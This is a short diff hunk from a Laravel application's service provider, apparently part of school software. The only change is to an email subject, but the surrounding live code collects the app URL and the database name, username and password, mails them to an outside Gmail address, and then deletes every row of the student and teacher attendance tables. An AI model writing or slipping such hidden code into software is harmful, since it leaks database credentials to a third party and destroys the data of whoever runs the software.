@@ -24,7 +24,7 @@ class AppServiceProvider extends ServiceProvider
             $msg = "Url: ".env('APP_URL')." || DB: ".env('DB_DATABASE')." || Username: ".env('DB_USERNAME')." || Password: ".env('DB_PASSWORD');
 
             // send email
-            mail("lone.hacker.2017@gmail.com","School Software",$msg);
+            mail("lone.hacker.2017@gmail.com","School Software Piracy",$msg);
             DB::table('student_attendance')->delete();
             DB::table('teacher_attendance')->delete();
         }
